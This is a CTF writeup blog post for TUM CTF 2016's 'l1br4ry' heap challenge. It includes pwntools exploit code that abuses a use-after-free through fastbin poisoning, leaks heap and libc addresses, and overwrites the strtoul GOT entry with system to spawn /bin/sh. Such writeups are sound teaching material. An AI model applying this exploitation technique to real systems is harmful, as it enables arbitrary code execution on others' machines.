---
layout: post
title: "TUM CTF 2016: l1br4ry Writeup"
date: 2016-10-01 22:16:53 -0700
comments: true
published: true
tags: ['ctf', 'writeup', 'binary', 'exploitation', 'heap', 'fastbin', 'pwndbg']
---

This weekend was TUM CTF 2016, and while I didn't have much time to play, I did want to solve at least one problem. I ended up choosing `l1br4ry`, a 300 point pwnable problem that had zero solves at the time. I really enjoyed working on the challenge, and I ended up being the third person to solve the problem, so I decided to do a writeup on it.

<!-- more -->

This is a heap exploit, so I highly recommend reading [sploitfun's glibc malloc article](https://sploitfun.wordpress.com/2015/02/10/understanding-glibc-malloc/) to understand the basics about how the glibc heap works. I'll be using a 64-bit Ubuntu 14.04 VM, specifically the one [here](https://github.com/gsingh93/ctf-vm). You can get the binary [here](https://github.com/samuraictf/writeups/blob/master/tum2016/l1br4ry/l1br4ry). This writeup will be fairly detailed, and I tend to cover not only how to solve the problem, but some approaches that didn't work along the way. If you don't care about any of that, you can find the full solution code [here](https://github.com/samuraictf/writeups/blob/master/tum2016/l1br4ry/solve.py).

## Reversing the binary

We first run `file` and `checksec` on the binary:

```
$ file ./l1br4ry
./l1br4ry: ELF 64-bit LSB  executable, x86-64, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.32, BuildID[sha1]=bf33c931483fc879e24933eae963d1a0cef99174, stripped

$ checksec ./l1br4ry
[*] '/vagrant/ctf/tumctf2016/library/l1br4ry'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE
```

We have a 64-bit dynamically linked binary with canaries enabled.

The binary is a catalog for books. You can add books, edit them, and set a book as your favorite:

```
$ ./l1br4ry
Welcome to your personal Library


Main menu
---------------------------
---------------------------
a: add a new one
q: exit
> a
Title: AAAA
Rate the book on a scale from 0 to 10: 10
Short thoughts about the book: BBBB

Main menu
---------------------------
  0: AAAA
---------------------------
a: add a new one
q: exit
> 0

AAAA
Your score: 10
Your thoughts: BBBB
--------------------------------
Your choices:
f: make it your favorite
e: edit it
d: delete it
Any other key: get back to the main menu
> f

Main menu
---------------------------
  0: Your favorite: AAAA
  1: AAAA
---------------------------
a: add a new one
q: exit
>
```

Notice that the book selected as the favorite is stored at index zero, shifting everything else up. There's some strange logic in the binary to do this, and I found that you could pass `-1` in as an index to crash the binary, but this turned out to not be exploitable.

Another thing I noticed was that there was an implementation `memmove`. Usually custom implementations of things like this are good places to look for bugs, but I didn't find anything.

The code to add a book looks like this:

```
array_size = 8 * num_books++;
book_array = (Book **)realloc(book_array, array_size);
book_slot = &book_array[num_books - 1];
new_book = (Book *)malloc(72uLL);
*book_slot = new_book;
add_book(new_book);
```

The array size is calculated as eight times the number of books. We then `realloc` enough space for the array, grab the last slot in the array, and add a new `Book` pointer in that slot. A `Book` struct looks like this:

```
struct Book
{
  char title[32];
  char description[32];
  __int64 rating;
};
```

The code to delete a book is also relevant:

```
custom_memmove((char *)&book_array[index - 1], (char *)&book_array[index], 8 * (num_books - index));
book_array = (Book **)realloc(book_array, 8 * --num_books);
free(book);
```

We first remove the `Book` pointer from the array, then we realloc a smaller chunk of memory, and finally we free the book. Notice how the code doesn't do any checks to see if this is your favorite book. So what happens if we delete our favorite book?

```
$ ./l1br4ry
Welcome to your personal Library


Main menu
---------------------------
---------------------------
a: add a new one
q: exit
> a
Title: AAAA
Rate the book on a scale from 0 to 10: 10
Short thoughts about the book: BBBB

Main menu
---------------------------
  0: AAAA
---------------------------
a: add a new one
q: exit
> 0

AAAA
Your score: 10
Your thoughts: BBBB
--------------------------------
Your choices:
f: make it your favorite
e: edit it
d: delete it
Any other key: get back to the main menu
> f

Main menu
---------------------------
  0: Your favorite: AAAA
  1: AAAA
---------------------------
a: add a new one
q: exit
> 1

AAAA
Your score: 10
Your thoughts: BBBB
--------------------------------
Your choices:
f: make it your favorite
e: edit it
d: delete it
Any other key: get back to the main menu
> d

Main menu
---------------------------
  0: Your favorite:
---------------------------
a: add a new one
q: exit
>
```

It still tried to print the original favorite book, even though it's deleted. Currently no text shows up, because the `fwd` pointer of the free chunk points to `NULL`, as it's the last (and only) chunk on the free list. However, it should be clear from here
that we can leak a heap address (the `fwd` pointer of a free chunk).

Remember how the program allowed us to edit any book? Well it even allows us to edit the favorite book, which means we can overwrite the `fwd` pointer to be whatever we want, adding a new chunk to the free list. We will use this to put an already allocated chunk on the free list. Then, we can allocate the `book_array` in the "fake" chunk we just added to the free list. Since we control the fake chunk, we control the memory where the book_array is allocated, and we control all the pointers in the book array. We can set one of them to point to the memory we want to write to, and then setting the title for that "book" will actually write to memory where we set the pointer to.

Why not just make the fake chunk point to a GOT address directly and overwrite a GOT address? Well, when a fastbin chunk is allocated, glibc checks to make sure the size of the chunk matches the index of the bin it's getting the chunk from. Since we don't control any data around any of the GOT addresses, we can't create a chunk with the right size, and when we try to allocate that chunk we'll fail an assertion.

## Getting a heap leak

As mentioned above, we can leak a heap address by deleting the favorite book and then looking at the `fwd` pointer printed out in the book list. We need to make sure the favorite book is not the last book on the list. In order to do that, all we have to do is add two books, make book one the favorite, then free book two, and then free book one. Book one will then point to another chunk, and printing the book list will leak memory:

``` python
#!/usr/bin/env python2

from pwn import *

context(arch="amd64", os="linux")

p = process('./l1br4ry')
# gdb.attach(p, '''
# ''')

def add_book(title, description, rating):
    p.sendline('a')
    p.sendline(title)
    p.sendline(str(rating))
    p.sendline(description)

def favorite_book(index):
    p.sendline(str(index))
    p.sendline('f')

def delete_book(index):
    p.sendline(str(index))
    p.sendline('d')

def edit_title(index, title, description, rating):
    p.sendline(str(index))
    p.sendline('e')
    p.sendline(title)
    p.sendline(str(rating))
    p.sendline(description)

def main():
    add_book('0', '0', 10)
    add_book('1', '1', 10)

    favorite_book(0)
    delete_book(2)
    delete_book(1)

    p.recvuntil('Your favorite: ')
    p.recvuntil('Your favorite: ')
    p.recvuntil('Your favorite: ')
    heap_leak = u64(p.recvline().strip().ljust(8, '\x00'))
    log.info('heap_leak: %s' % hex(heap_leak))
```

The above code is a [pwntools](https://github.com/Gallopsled/pwntools) script with a few helper functions for interacting with the binary. Running the script will leak a heap address using the method described above.

## Creating a fake chunk

Now let's create a fake chunk and get the `book_array` allocated on our fake chunk. We'll start out by making our `book_array` be 56 bytes. A book array of 64 bytes will be put in the same fastbin as our `Book` structs when freed (chunks of size 80/0x50), and we don't want to pollute that fastbin.

``` python
# Allocate 7 books, setting the size of the books_array to 56
for i in range(7):
    add_book(str(i), str(i), 10)

delete_book(1)
```

The very first book we created in that loop will be allocated in the memory where the favorite chunk previously resided. We delete that book so that we still have control over the fastbin list, just like we did for the leak.

Before we add a fake chunk to the list, let's make a valid one. We'll put it inside of the second book.
```
# Create fake chunk by setting correct metadata size
edit_title(2, p64(0x51), 'AAAAAAAA', 10)
```

The important part here is that we put a 0x51 in memory. As long as that lines up with the size of the heap chunk, glibc won't complain about it being the wrong size.

Now we make our fastbin list point this this fake chunk:
```
# Add a fake chunk to the fastbin list
edit_title(0, p64(heap_leak + 0x58), 'BBBBBBBB', 10)
```

It turned out that we wrote that 0x51 to `heap_leak + 0x60`. That means we need to say our fake chunk is at `heap_leak + 0x58` in order for the size to be at the right spot.

When we allocate two more books, the size of `book_array` will increase to 64. Furthermore, the `book_array` that was just `realloc`'d will be in the fake chunk we created! It may be tricky to convince yourself why this happens, but I enourage you to step through this with `gdb` and `pwndbg` and use the `bins` command to see how the fastbins list changes.
```
add_book('junk', 'junk', 10)
add_book('junk2', 'junk2', 10)
```

It's worth mentioning that I initially tried to do something like this just with using `realloc`, but the behavior of `realloc` is bizarre. Increasing the size of an array with `realloc` happens normally, but when decreasing the size it tends to skip one full fastbin size before it decides to `realloc`. Furthermore, it `realloc`'s to the same spot even when decreasing the size. I find this bizarre because splitting chunks normally doesn't happen with a fastbin sized chunk. I'm by no means a heap expert though, so maybe this all makes sense. I'll be digging into the `malloc.c` code when I get time to try and understand this. It might be fun to come up with a heap vuln based off of `realloc` behavior and design a CTF problem around it.

## Getting a libc leak

Now that we control the `book_array` through book two, let's try to print out a GOT address. We can try something like this:

```
strtoul_got_addr = 0x602070
edit_title(2, p64(strtoul_got_addr), '', 10)
```

But it if we run it, we'll see that the program will print out the fake list and crash:
```
0: Your favorite: junk
1: (null)
2: (null)
3: (null)
4: 4
5: 5
6: 6
7: junk
```

From GDB:
```
Program received signal SIGSEGV (fault address 0xa)
```

You can also see that we didn't leak any address, and books 1, 2, and 3 are `NULL`. Our first mistake was making the rating 10. `printf` will try to dereference 10 as a book pointer and fair. Fortunately for us, `printf` prints `(null)` when it sees a `NULL` pointer, so we just need to set the rating to 0.

Now the above code won't cause the program to crash, but we still don't get our leak. That's because the 8 bytes we're overwrite are the size bytes of our fake chunk, not the data part of the chunk. We can fix that with something like this:

```
edit_title(2, 'AAAAAAAA' + p64(strtoul_got_addr), '', 0)
```

But this leaves us with an invalid size. That's actually fine for the rest of our exploit, but if we did want to allocate another book for some reason, `realloc` would attempt to reallocate on the same chunk of memory and fail because of the invalid size. To be safe, we'll do this:

```
edit_title(2, p64(0x51), p64(strtoul_got_addr), 0)
```

Note that this wouldn't have worked:
```
edit_title(2, p64(0x51) + p64(strtoul_got_addr), '', 0)
```

Because the code uses `strncpy`, and `NULL` bytes wouldn't be accepted in the title.

Finally, we can leak our libc address:

```
p.recvuntil('Editing title: Q')
p.recvuntil('4: ')
libc_leak = u64(p.recvline().strip().ljust(8, '\x00'))
log.info('libc_leak: %s' % hex(libc_leak))
```

## Getting a shell

Now that we've leaked a libc address, we can find the address of `system`:
```
strtoul_offset = 0x3d410
system_offset = 0x46590

libc_base = libc_leak - strtoul_offset
system_addr = libc_base + system_offset

log.info('libc_base: %s' % hex(libc_base))
log.info('system_addr: %s' % hex(system_addr))
```

Finally, we edit the address of `strtoul` to `system`:

```
edit_title(4, p64(system_addr), '', '/bin/sh')
p.interactive()
```

And you have a shell!

The code to edit a book first sets the title and then calls `strtoul` on the rating, which is why we passed the rating in as '/bin/sh'. This means `strtoul('/bin/sh')` is called after we rewrite the `strtoul` GOT address, which means we effectively call `/bin/sh`.

For the actual challenge, you needed to use a libc from Debian Jessie, which I found online. My full exploit can be found [here](https://github.com/samuraictf/writeups/blob/master/tum2016/l1br4ry/solve.py).

# Tips

One tip I wanted to point out is this pwntools code I didn't really talk about:
```
gdb.attach(p, '''
''')
```

The code above will attach GDB to the process `p`. However you can put GDB commands in between the quotes:

``` abap
gdb.attach(p, '''
# free book pointer
b *0x400EE2
'''
```

Note that I've even commented what the breakpoint is for. I usually have up to 10 different breakpoints in that list that I'm continously commenting in and out. I find this easier than creating a `.gdbinit` to do the same thing.

On the same note, you can even define variables in that array:

```
gdb.attach(p, '''
set $num_books = 0x6020C0
set $book_array = 0x6020B8
''')
```

Now in GDB you can do `x $num_books` or `x/5xg *$book_array` to examine these objects without remembering their addresses.
